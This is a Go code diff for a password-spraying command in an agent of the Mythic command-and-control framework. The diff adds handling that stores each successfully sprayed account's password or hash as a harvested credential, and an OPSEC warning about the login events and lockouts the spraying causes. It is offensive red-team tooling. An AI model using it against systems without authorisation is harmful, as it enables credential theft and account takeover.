@@ -1,11 +1,13 @@
 package agentfunctions
 
 import (
+	"encoding/json"
 	"fmt"
 	"path/filepath"
 	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
+	"github.com/MythicMeta/MythicContainer/mythicrpc"
 )
 
 func init() {
@@ -145,6 +147,62 @@ func init() {
 		},
 		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
 			return args.LoadArgsFromDictionary(input)
+		},
+		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
+			response := agentstructs.PTTaskProcessResponseMessageResponse{
+				TaskID:  processResponse.TaskData.Task.ID,
+				Success: true,
+			}
+			responseText, ok := processResponse.Response.(string)
+			if !ok || responseText == "" {
+				return response
+			}
+			// Parse JSON array of spray results
+			type sprayEntry struct {
+				Username string `json:"username"`
+				Success  bool   `json:"success"`
+				Message  string `json:"message"`
+			}
+			var results []sprayEntry
+			if err := json.Unmarshal([]byte(responseText), &results); err != nil {
+				return response // Not JSON, skip
+			}
+			domain := processResponse.TaskData.Callback.Host
+			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
+			for _, r := range results {
+				if !r.Success {
+					continue
+				}
+				// Extract password from the original task params
+				password, _ := processResponse.TaskData.Args.GetStringArg("password")
+				credType := "password"
+				credential := password
+				// For SMB with hash, register as hash type
+				protocol, _ := processResponse.TaskData.Args.GetStringArg("protocol")
+				if protocol == "smb" && strings.Contains(password, ":") {
+					credType = "hash"
+				}
+				creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+					CredentialType: credType,
+					Realm:          domain,
+					Account:        r.Username,
+					Credential:     credential,
+					Comment:        fmt.Sprintf("spray (%s)", protocol),
+				})
+			}
+			registerCredentials(processResponse.TaskData.Task.ID, creds)
+			return response
+		},
+		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
+			protocol, _ := taskData.Args.GetStringArg("protocol")
+			host, _ := taskData.Args.GetStringArg("host")
+			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
+				TaskID:             taskData.Task.ID,
+				Success:            true,
+				OpsecPreBlocked:    false,
+				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: Password spraying via %s against %s. Generates multiple authentication events (4625/4624) in rapid succession. May trigger account lockout policies and is highly visible to SIEM correlation rules monitoring failed login patterns.", protocol, host),
+				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
+			}
 		},
 		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
 			response := agentstructs.PTTaskCreateTaskingMessageResponse{
